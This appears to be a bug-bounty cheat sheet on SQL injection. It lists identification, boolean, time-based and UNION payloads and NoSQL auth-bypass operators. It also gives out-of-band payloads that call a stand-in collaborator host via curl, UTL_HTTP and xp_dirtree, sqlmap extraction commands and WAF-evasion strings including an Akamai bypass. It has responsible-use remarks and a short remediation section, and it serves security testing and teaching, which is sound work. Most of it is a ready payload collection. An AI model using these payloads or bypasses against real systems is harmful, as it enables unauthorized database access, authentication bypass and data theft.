# SQL Injection

Modern apps: ORMs, parameterized queries everywhere — the interesting bugs are at boundaries.

## Where to hunt

- Search/filter endpoints with dynamic sort (`ORDER BY`), dynamic column list, `IN (...)` arrays.
- Admin/reporting UIs with raw query builders.
- Legacy endpoints (v1, /old, /internal).
- Second-order — stored payload rendered later in a different query.
- Headers used in logging queries (`User-Agent`, `Referer`, `X-Forwarded-For`).
- NoSQL (MongoDB) via JSON — `{"$ne":null}`.

## Identification

```
payload          expected behavior
'                error?
''               no error
'||'a            boolean differential
' OR 1=1-- -     auth bypass / list flood
' AND 1=2-- -    empty result
' AND SLEEP(5)-- time delta
```

Run same payload URL-encoded and double-encoded in separate runs to defeat WAF.

## Blind techniques

**Boolean-based:**
```
1 AND (SELECT SUBSTR(username,1,1) FROM users WHERE id=1)='a'
```

**Time-based:**
```
MySQL:    SLEEP(5)
MSSQL:    WAITFOR DELAY '0:0:5'
Postgres: pg_sleep(5)
Oracle:   DBMS_LOCK.SLEEP(5) or DBMS_PIPE.RECEIVE_MESSAGE('a',5)
SQLite:   randomblob(100000000)  (heavy, use sparingly)
```

**OOB (Oracle, MSSQL, Postgres):**
```
MSSQL:    EXEC master..xp_dirtree '\\<collab>\a'
Oracle:   UTL_HTTP.REQUEST('http://<collab>/')
Postgres: COPY (SELECT 1) TO PROGRAM 'curl http://<collab>/'  (needs superuser)
MySQL:    LOAD_FILE + `into outfile \\\\<collab>\\a` (rare)
```

## 2nd order

Store benign-looking payload; it executes when another flow uses it unsanitized.

Example: username registration allows `admin'--`; later, audit query `SELECT * FROM logs WHERE user = '$u'` runs raw.

Test flow: sign up / update profile → trigger the consuming action → watch errors / timing.

## NoSQL (MongoDB)

```json
{"user":"admin","pass":{"$ne":null}}          // auth bypass
{"user":"admin","pass":{"$regex":"^a"}}       // blind leak
```

In URL: `user[$ne]=null&pass[$ne]=null` if body parsed as object.

Operators to abuse: `$ne`, `$gt`, `$regex`, `$where` (JS eval), `$expr`, `$lookup`.

## ORM-layer

Even with parameterized queries, ORMs have pitfalls:
- Sequelize `literal()`, `Op.and: [sequelize.literal('..')]`.
- SQLAlchemy `text()` without bound params.
- Hibernate HQL with string concat.
- Django `raw()`, `extra(where=[...])` with user input.
- `ORDER BY $col` — column names can't be parameterized.

## UNION extraction (when response echoes)

1. Find column count: `ORDER BY 1-- -`, `ORDER BY 2-- -` … until error.
2. Find echoed column: `UNION SELECT 'a','b','c'-- -` — see which shows.
3. Extract: `UNION SELECT table_name,NULL,NULL FROM information_schema.tables-- -`.

## sqlmap — responsible use

```bash
# Confirmed injection, conservative
sqlmap -u "https://target.com/x?id=1" --batch --random-agent \
  --level=3 --risk=2 \
  --technique=BEUST \
  --headers="X-Bug-Bounty: kdairatchi" \
  --delay=1 --timeout=15

# Extract just what you need — don't dump full DB
sqlmap ... --current-user --current-db --hostname
sqlmap ... --tables -D target_db
sqlmap ... --dump -T users -D target_db --where "id=1"
```

Stop at PoC. Do not bulk-dump user data.

## WAF bypasses

See `waf-bypass.md`. SQLi-specific: inline comments `/*!50000SELECT*/`, whitespace alternatives (`%09`, `%0a`, `%0c`, `/**/`), function aliases (`ifnull` vs `coalesce`), conditional error (`AND 1=(SELECT 1/0)`).

### Akamai Kona bypass

- `MID` instead of `SUBSTRING`
- `LIKE` instead of `=`
- `/**/` instead of space
- `CURRENT_USER` instead of `CURRENT_USER()`
- `"` instead of `'`

```sql
444/**/OR/**/MID(CURRENT_USER,1,1)/**/LIKE/**/"p"/**/#
```

## Remediation

- Parameterized queries everywhere. No exceptions.
- For dynamic SQL (sort columns), allowlist.
- Least-privileged DB user per service.
- Disable `xp_cmdshell`, restrict `COPY ... FROM PROGRAM`.

## References

- PortSwigger — https://portswigger.net/web-security/sql-injection
- PayloadsAllTheThings SQLi — https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
- HackTricks — https://book.hacktricks.xyz/pentesting-web/sql-injection
- HackerOne writeup (Starbucks ORDER BY injection) — https://hackerone.com/reports/531051
